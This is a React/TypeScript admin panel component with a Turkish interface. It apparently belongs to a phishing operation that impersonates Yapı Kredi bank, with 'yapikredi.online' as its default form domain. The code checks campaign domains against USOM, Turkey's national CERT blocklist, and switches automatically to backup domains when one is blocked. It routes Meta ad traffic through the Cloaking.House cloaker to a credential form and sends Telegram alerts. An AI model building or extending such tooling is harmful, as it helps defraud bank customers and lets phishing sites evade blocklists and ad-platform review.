"use client";

import { useEffect, useRef, useState } from "react";
import { adPoolDomains, domainRole } from "@/lib/domains/active-ad";
import { isFailoverExcluded } from "@/lib/domains/failover";
import type { FailoverEvent, SiteDomain } from "@/lib/domains/types";

interface UsomDomainCheck {
  hostname: string;
  onUsomList: boolean;
  lastUsomCheck: string | null;
  status: SiteDomain["status"];
}

interface UsomCheckResponse {
  checkedAt: string;
  listSize: number;
  activeDomain: string | null;
  activeBlocked: boolean;
  blockedHostnames: string[];
  domains: SiteDomain[];
  domainChecks: UsomDomainCheck[];
  message: string;
  failover?: { from: string; to: string | null; kind?: "ad" | "form" };
}

interface DomainsResponse {
  domains: SiteDomain[];
  activeDomain: string | null;
  formDomain: string;
}

interface FailoverListResponse {
  events: FailoverEvent[];
}

interface SettingsResponse {
  autoFailover: boolean;
  offerHost: string;
}

interface Props {
  authToken: string;
  crmFetch: <T>(
    path: string,
    authToken: string,
    init?: RequestInit
  ) => Promise<
    | { ok: true; data: T }
    | { ok: false; reason: "auth" | "server"; message?: string }
  >;
  onError: (message: string) => void;
}

function roleBadgeClass(role: string): string {
  if (role === "Reklam (aktif)") return "bg-green-100 text-green-800";
  if (role === "USOM engelli") return "bg-red-100 text-red-800";
  if (role === "Hariç") return "bg-gray-100 text-gray-500";
  return "bg-blue-50 text-blue-800";
}

export function CrmUsomPanel({ authToken, crmFetch, onError }: Props) {
  const [domains, setDomains] = useState<SiteDomain[]>([]);
  const [activeDomain, setActiveDomain] = useState<string | null>(null);
  const [formDomain, setFormDomain] = useState("yapikredi.online");
  const [activeBlocked, setActiveBlocked] = useState(false);
  const [lastCheck, setLastCheck] = useState<string | null>(null);
  const [listSize, setListSize] = useState<number | null>(null);
  const [loading, setLoading] = useState(false);
  const [newHostname, setNewHostname] = useState("");
  const [autoFailover, setAutoFailover] = useState(true);
  const [offerHostInput, setOfferHostInput] = useState("yapikredi.online");
  const [failoverEvents, setFailoverEvents] = useState<FailoverEvent[]>([]);
  const [notice, setNotice] = useState("");
  const [checkResult, setCheckResult] = useState<UsomCheckResponse | null>(null);
  const [usomBlocked, setUsomBlocked] = useState<Set<string>>(new Set());
  const [removingDomain, setRemovingDomain] = useState<string | null>(null);
  const [removeSteps, setRemoveSteps] = useState<Record<string, Array<{step:string;status:string;detail:string}>>>({});
  const removeRef = useRef<HTMLDivElement | null>(null);

  const blockedSet = checkResult
    ? new Set(checkResult.blockedHostnames)
    : usomBlocked;

  const domainOnUsom = (hostname: string) => blockedSet.has(hostname);

  const adDomains = adPoolDomains(domains).filter(
    (d) => !isFailoverExcluded(d.hostname)
  );
  const excludedDomains = domains.filter((d) =>
    isFailoverExcluded(d.hostname)
  );
  const formRecord = domains.find((d) => d.hostname === formDomain);

  const loadSettings = async () => {
    const result = await crmFetch<SettingsResponse>(
      "/api/crm/settings",
      authToken
    );
    if (result.ok) {
      setAutoFailover(result.data.autoFailover);
      if (result.data.offerHost) {
        setFormDomain(result.data.offerHost);
        setOfferHostInput(result.data.offerHost);
      }
    }
  };

  const loadFailoverEvents = async () => {
    const result = await crmFetch<FailoverListResponse>(
      "/api/crm/failover",
      authToken
    );
    if (result.ok) setFailoverEvents(result.data.events);
  };

  const loadDomains = async () => {
    const result = await crmFetch<DomainsResponse>(
      "/api/crm/domains",
      authToken
    );
    if (!result.ok) {
      onError(result.message ?? "Domain listesi yüklenemedi");
      return;
    }
    setDomains(result.data.domains);
    setActiveDomain(result.data.activeDomain);
    if (result.data.formDomain) setFormDomain(result.data.formDomain);
  };

  useEffect(() => {
    if (!authToken) return;
    void loadSettings();
    void loadDomains();
    void loadFailoverEvents();
  }, [authToken]);

  const runUsomCheck = async () => {
    setLoading(true);
    setCheckResult(null);
    setNotice("");
    try {
      const result = await crmFetch<UsomCheckResponse>(
        "/api/crm/usom/check",
        authToken
      );
      if (!result.ok) {
        onError(result.message ?? "USOM kontrolü başarısız");
        return;
      }
      setCheckResult(result.data);
      setDomains(result.data.domains);
      setActiveDomain(result.data.activeDomain);
      setActiveBlocked(result.data.activeBlocked);
      setLastCheck(result.data.checkedAt);
      setListSize(result.data.listSize);
      setUsomBlocked(new Set(result.data.blockedHostnames));
      await loadFailoverEvents();
    } finally {
      setLoading(false);
    }
  };

  const toggleAutoFailover = async () => {
    setLoading(true);
    try {
      const next = !autoFailover;
      const result = await crmFetch<SettingsResponse>(
        "/api/crm/settings",
        authToken,
        {
          method: "PATCH",
          body: JSON.stringify({ autoFailover: next }),
        }
      );
      if (!result.ok) {
        onError(result.message ?? "Ayar kaydedilemedi");
        return;
      }
      setAutoFailover(result.data.autoFailover);
    } finally {
      setLoading(false);
    }
  };

  const saveOfferHost = async () => {
    const offerHost = offerHostInput.trim();
    if (!offerHost) return;

    setLoading(true);
    try {
      const result = await crmFetch<SettingsResponse>(
        "/api/crm/settings",
        authToken,
        {
          method: "PATCH",
          body: JSON.stringify({ autoFailover, offerHost }),
        }
      );
      if (!result.ok) {
        onError(result.message ?? "Form domaini kaydedilemedi");
        return;
      }
      setFormDomain(result.data.offerHost);
      setOfferHostInput(result.data.offerHost);
      setNotice(`Form/offer domaini güncellendi: https://${result.data.offerHost}/`);
      await loadDomains();
    } finally {
      setLoading(false);
    }
  };

  const testTelegram = async () => {
    setLoading(true);
    try {
      const result = await crmFetch<{ ok: boolean }>(
        "/api/crm/failover",
        authToken,
        { method: "POST" }
      );
      if (!result.ok) {
        onError(result.message ?? "Telegram testi başarısız");
        return;
      }
      setNotice("Telegram test mesajı gönderildi.");
    } finally {
      setLoading(false);
    }
  };

  const copyUrl = (host: string) => {
    void navigator.clipboard.writeText(`https://${host}/`);
    setNotice(`Kopyalandı: https://${host}/`);
  };

  const activateDomain = async (hostname: string) => {
    if (
      !window.confirm(
        `"${hostname}" panelde seçili reklam URL'si olarak işaretlensin mi?\n\nBu işlem domainleri birbirine yönlendirmez. Meta/Cloaking.House kampanya URL'sini ayrıca bu domainle güncellemeniz gerekir.`
      )
    ) {
      return;
    }

    setLoading(true);
    try {
      const result = await crmFetch<SiteDomain>("/api/crm/domains", authToken, {
        method: "PATCH",
        body: JSON.stringify({ hostname }),
      });
      if (!result.ok) {
        onError(result.message ?? "Domain aktif edilemedi");
        return;
      }
      await loadDomains();
      setActiveDomain(result.data.hostname);
      setActiveBlocked(false);
      setNotice(`Seçili reklam URL'si: https://${result.data.hostname}/`);
    } finally {
      setLoading(false);
    }
  };

  const addDomain = async () => {
    const hostname = newHostname.trim();
    if (!hostname) return;

    setLoading(true);
    try {
      const result = await crmFetch<SiteDomain>("/api/crm/domains", authToken, {
        method: "POST",
        body: JSON.stringify({ hostname }),
      });
      if (!result.ok) {
        onError(result.message ?? "Domain eklenemedi");
        return;
      }
      setNewHostname("");
      await loadDomains();
    } finally {
      setLoading(false);
    }
  };
  const routeToVercel = async (hostname: string) => {
    if (!window.confirm(`"${hostname}" alan adını Vercel'e yönlendirmek istediğinize emin misiniz?\n\nBu işlem Cloudflare'i devreden çıkaracaktır.`)) {
      return;
    }
    setLoading(true);
    try {
      const result = await crmFetch<{ success: boolean; message: string }>(
        "/api/crm/spaceship-route",
        authToken,
        { method: "POST", body: JSON.stringify({ hostname }) }
      );
      if (!result.ok) {
        onError(result.message ?? "Yönlendirme başarısız oldu");
        return;
      }
      setNotice(`Vercel yönlendirmesi başarıyla tamamlandı: ${hostname}`);
    } finally {
      setLoading(false);
    }
  };

  const removeFromVercel = async (hostname: string) => {
    if (!window.confirm(`"${hostname}" alan adını projeden kaldırmak istiyor musunuz?\n\n• Vercel projesinden silinir\n• ENTRY_HOSTS listesinden çıkar\n• NS → Spaceship'e döner`)) return;
    setRemovingDomain(hostname);
    setRemoveSteps((prev) => ({ ...prev, [hostname]: [] }));
    try {
      const res = await fetch(`/api/crm/spaceship-domains?hostname=${encodeURIComponent(hostname)}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${authToken}` },
      });
      const json = await res.json() as { steps: Array<{step:string;status:string;detail:string}>; success: boolean };
      setRemoveSteps((prev) => ({ ...prev, [hostname]: json.steps ?? [] }));
      if (json.success) {
        setNotice(`"${hostname}" projeden kaldırıldı`);
        await loadDomains();
      }
      setTimeout(() => removeRef.current?.scrollIntoView({ behavior: "smooth", block: "nearest" }), 100);
    } catch (e) {
      setRemoveSteps((prev) => ({ ...prev, [hostname]: [{ step: "Bağlantı", status: "error", detail: e instanceof Error ? e.message : "Hata" }] }));
    } finally {
      setRemovingDomain(null);
    }
  };

  const removeFromListOnly = async (hostname: string) => {
    if (!window.confirm(`"${hostname}" alan adını SADECE listeden çıkarmak istiyor musunuz?\n\nBu işlem NS kayıtlarına ve Vercel ayarlarına dokunmaz.`)) return;
    setRemovingDomain(hostname);
    setRemoveSteps((prev) => ({ ...prev, [hostname]: [] }));
    try {
      const res = await fetch(`/api/crm/spaceship-domains?hostname=${encodeURIComponent(hostname)}&onlyDb=true`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${authToken}` },
      });
      const json = await res.json() as { steps: Array<{step:string;status:string;detail:string}>; success: boolean };
      setRemoveSteps((prev) => ({ ...prev, [hostname]: json.steps ?? [] }));
      if (json.success) {
        setNotice(`"${hostname}" sadece veritabanından kaldırıldı.`);
        await loadDomains();
      }
      setTimeout(() => removeRef.current?.scrollIntoView({ behavior: "smooth", block: "nearest" }), 100);
    } catch (e) {
      setRemoveSteps((prev) => ({ ...prev, [hostname]: [{ step: "Bağlantı", status: "error", detail: e instanceof Error ? e.message : "Hata" }] }));
    } finally {
      setRemovingDomain(null);
    }
  };

  return (
    <div className="space-y-4">
      {notice && (
        <div className="rounded-lg border border-green-300 bg-green-50 p-3 text-sm text-green-800">
          {notice}
        </div>
      )}
      {checkResult && (
        <div
          className={`rounded-lg border p-4 text-sm ${
            checkResult.blockedHostnames.length > 0
              ? "border-amber-300 bg-amber-50 text-amber-900"
              : "border-green-300 bg-green-50 text-green-900"
          }`}
        >
          <p className="font-medium">
            {checkResult.blockedHostnames.length > 0
              ? "USOM kontrolü — engelli domain var"
              : "USOM kontrolü — temiz"}
          </p>
          <p className="mt-1">{checkResult.message}</p>
          <p className="mt-2 text-xs opacity-80">
            {new Date(checkResult.checkedAt).toLocaleString("tr-TR")} ·{" "}
            {checkResult.listSize.toLocaleString("tr-TR")} USOM kaydı tarandı
          </p>
          {checkResult.failover && (
            <p className="mt-2 text-xs font-medium">
              Failover: {checkResult.failover.from} →{" "}
              {checkResult.failover.to ?? "yedek yok"}
            </p>
          )}
        </div>
      )}
      {!activeDomain && !loading && (
        <div className="rounded-lg border border-amber-300 bg-amber-50 p-4 text-sm text-amber-900">
          <strong>Seçili reklam domaini yok.</strong> Aşağıdaki tablodan kampanyada
          kullanacağınız domain için &quot;Reklam URL yap&quot; seçin.
        </div>
      )}

      <div className="rounded-lg bg-white p-4 shadow">
        <h2 className="mb-1 font-semibold text-gray-800">USOM / Domain</h2>
        <p className="mb-4 text-xs text-gray-500">
          Meta reklamı → giriş domaini → cloak → form domaini. Seçtiğiniz reklam
          URL'si panelde işaretlenir; domainler birbirine yönlenmez.
        </p>

        <div className="mb-4 grid gap-3 sm:grid-cols-2">
          <div className="rounded-lg border-2 border-green-200 bg-green-50 p-4">
            <p className="text-xs font-medium uppercase tracking-wide text-green-700">
              1 · Seçili Meta reklam URL
            </p>
            <p className="mt-1 font-mono text-lg text-green-900">
              {activeDomain ? `https://${activeDomain}/` : "—"}
            </p>
            <p className="mt-1 text-xs text-green-700">
              Kampanyada ve Cloaking.House&apos;ta bu adres kullanılır. Diğer reklam domainleri bu adrese yönlendirilmez.
            </p>
            {activeDomain && (
              <button
                type="button"
                onClick={() => copyUrl(activeDomain)}
                className="mt-2 text-xs text-green-800 underline"
              >
                Kopyala
              </button>
            )}
          </div>

          <div className="rounded-lg border border-gray-200 bg-gray-50 p-4">
            <p className="text-xs font-medium uppercase tracking-wide text-gray-600">
              2 · Offer/Form domaini
            </p>
            <p className="mt-1 font-mono text-lg text-gray-900">
              https://{formDomain}/
            </p>
            <p className="mt-1 text-xs text-gray-600">
              Cloaker offer kararı verirse buraya geçilir. Banlanırsa buradan değiştirilebilir.
            </p>
            <div className="mt-3 flex gap-2">
              <input
                type="text"
                className="min-w-0 flex-1 rounded border px-2 py-1 text-xs"
                value={offerHostInput}
                onChange={(e) => setOfferHostInput(e.target.value)}
                placeholder="yeni-form-domain.com"
              />
              <button
                type="button"
                onClick={saveOfferHost}
                disabled={loading || !offerHostInput.trim()}
                className="rounded border px-2 py-1 text-xs"
              >
                Kaydet
              </button>
            </div>
            {formRecord?.lastUsomCheck && (
              <p className="mt-2 text-xs text-gray-400">
                Son kontrol:{" "}
                {new Date(formRecord.lastUsomCheck).toLocaleString("tr-TR")}
                {lastCheck && (
                  <>
                    {" "}
                    · USOM:{" "}
                    <span
                      className={
                        domainOnUsom(formDomain)
                          ? "text-red-600"
                          : "text-green-700"
                      }
                    >
                      {domainOnUsom(formDomain) ? "Listede" : "Temiz"}
                    </span>
                  </>
                )}
              </p>
            )}
          </div>
        </div>

        <div className="mb-4 flex flex-wrap gap-2 border-t pt-4">
          <button
            type="button"
            onClick={loadDomains}
            disabled={loading}
            className="rounded border px-3 py-1.5 text-sm"
          >
            Yenile
          </button>
          <button
            type="button"
            onClick={runUsomCheck}
            disabled={loading}
            className="rounded bg-ykb-primary px-3 py-1.5 text-sm text-white disabled:opacity-60"
          >
            {loading ? "Kontrol..." : "USOM kontrol"}
          </button>
          <button
            type="button"
            onClick={testTelegram}
            disabled={loading}
            className="rounded border px-3 py-1.5 text-sm"
          >
            Telegram test
          </button>
          <button
            type="button"
            onClick={toggleAutoFailover}
            disabled={loading}
            className={`rounded border px-3 py-1.5 text-sm ${autoFailover ? "border-green-500 text-green-700" : ""}`}
          >
            Otomatik failover: {autoFailover ? "Açık" : "Kapalı"}
          </button>
          {lastCheck && (
            <span className="self-center text-xs text-gray-400">
              Son kontrol: {new Date(lastCheck).toLocaleString("tr-TR")}
              {listSize !== null && ` · ${listSize} USOM kaydı`}
            </span>
          )}
        </div>

        <h3 className="mb-2 text-sm font-medium text-gray-700">
          Reklam domainleri
        </h3>
        <div className="mb-4 overflow-x-auto">
          <table className="w-full text-left text-sm">
            <thead>
              <tr className="border-b text-gray-500">
                <th className="py-2 pr-4">Domain</th>
                <th className="py-2 pr-4">Rol</th>
                <th className="py-2 pr-4">USOM</th>
                <th className="py-2 pr-4">Son kontrol</th>
                <th className="py-2">İşlem</th>
              </tr>
            </thead>
            <tbody>
              {adDomains.length === 0 && (
                <tr>
                  <td colSpan={5} className="py-4 text-gray-400">
                    Reklam domaini yok — aşağıdan domain ekleyin.
                  </td>
                </tr>
              )}
              {adDomains.map((d) => {
                const role = domainRole(d, activeDomain, formDomain);
                const onUsom = domainOnUsom(d.hostname);
                return (
                  <tr key={d.id} className="border-b">
                    <td className="py-2 pr-4 font-mono">{d.hostname}</td>
                    <td className="py-2 pr-4">
                      <span
                        className={`rounded px-2 py-0.5 text-xs ${roleBadgeClass(role)}`}
                      >
                        {role}
                      </span>
                    </td>
                    <td className="py-2 pr-4">
                      {lastCheck || d.lastUsomCheck ? (
                        <span
                          className={
                            onUsom
                              ? "font-medium text-red-600"
                              : "text-green-700"
                          }
                        >
                          {onUsom ? "Listede" : "Temiz"}
                        </span>
                      ) : (
                        <span className="text-gray-400">Henüz kontrol yok</span>
                      )}
                    </td>
                    <td className="py-2 pr-4 text-gray-500">
                      {d.lastUsomCheck
                        ? new Date(d.lastUsomCheck).toLocaleString("tr-TR")
                        : "—"}
                    </td>
                    <td className="py-2">
                      <div className="flex flex-col gap-1 items-start">
                        {role === "Reklam (aktif)" ? (
                          <button
                            type="button"
                            onClick={() => copyUrl(d.hostname)}
                            className="text-xs text-ykb-primary underline"
                          >
                            URL kopyala
                          </button>
                        ) : role === "Reklam (yedek)" ? (
                          <button
                            type="button"
                            onClick={() => activateDomain(d.hostname)}
                            disabled={loading}
                            className="text-xs text-ykb-primary underline hover:text-blue-700"
                          >
                            Reklam URL yap
                          </button>
                        ) : null}
                        <button
                          type="button"
                          onClick={() => removeFromVercel(d.hostname)}
                          disabled={removingDomain === d.hostname || loading}
                          className="text-xs text-red-500 underline hover:text-red-700 mt-1 disabled:opacity-50"
                        >
                          {removingDomain === d.hostname ? "İşleniyor…" : "Tamamen Kaldır"}
                        </button>
                        <button
                          type="button"
                          onClick={() => removeFromListOnly(d.hostname)}
                          disabled={removingDomain === d.hostname || loading}
                          className="text-xs text-gray-500 underline hover:text-gray-700 mt-0.5 disabled:opacity-50"
                        >
                          Sadece Listeden Çıkar
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {/* Projeden Kaldır adım sonuçları */}
        {Object.entries(removeSteps).map(([host, steps]) =>
          steps.length > 0 ? (
            <div key={host} ref={removeRef} className={`mt-2 rounded-lg border p-3 text-xs ${steps.every(s => s.status !== "error") ? "border-orange-200 bg-orange-50" : "border-red-200 bg-red-50"}`}>
              <p className="mb-2 font-semibold">
                {steps.every(s => s.status !== "error") ? `✅ "${host}" projeden kaldırıldı` : `❌ "${host}" kaldırılırken hata oluştu`}
              </p>
              <div className="space-y-1">
                {steps.map((s, i) => (
                  <div key={i} className={`rounded border px-2 py-1 ${
                    s.status === "ok" ? "border-green-200 bg-green-50 text-green-800"
                    : s.status === "error" ? "border-red-200 bg-red-50 text-red-800"
                    : "border-amber-200 bg-amber-50 text-amber-800"
                  }`}>
                    <span className="font-medium">{s.status === "ok" ? "✅" : s.status === "error" ? "❌" : "⚠️"} {s.step}:</span>{" "}
                    <span className="font-mono">{s.detail}</span>
                  </div>
                ))}
              </div>
            </div>
          ) : null
        )}

        {excludedDomains.length > 0 && (
          <p className="mb-4 text-xs text-gray-400">
            Hariç tutulan:{" "}
            {excludedDomains.map((d) => d.hostname).join(", ")} (CF block —
            failover kullanılmaz)
          </p>
        )}

        <div className="flex gap-2 border-t pt-4">
          <input
            type="text"
            className="flex-1 rounded border px-3 py-2 text-sm"
            placeholder="reklam-domaini.com"
            value={newHostname}
            onChange={(e) => setNewHostname(e.target.value)}
          />
          <button
            type="button"
            onClick={addDomain}
            disabled={loading || !newHostname.trim()}
            className="rounded border px-3 py-2 text-sm"
          >
            Reklam domaini ekle
          </button>
        </div>
      </div>

      {failoverEvents.length > 0 && (
        <div className="rounded-lg bg-white p-4 shadow">
          <h3 className="mb-2 font-semibold text-gray-800">Failover geçmişi</h3>
          <ul className="space-y-2 text-sm">
            {failoverEvents.map((e) => (
              <li key={e.id} className="border-b pb-2 text-gray-600">
                <span className="font-mono">{e.fromHostname}</span>
                {" → "}
                <span className="font-mono">{e.toHostname ?? "—"}</span>
                <span className="ml-2 text-xs text-gray-400">
                  {new Date(e.createdAt).toLocaleString("tr-TR")} ({e.trigger})
                </span>
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
}
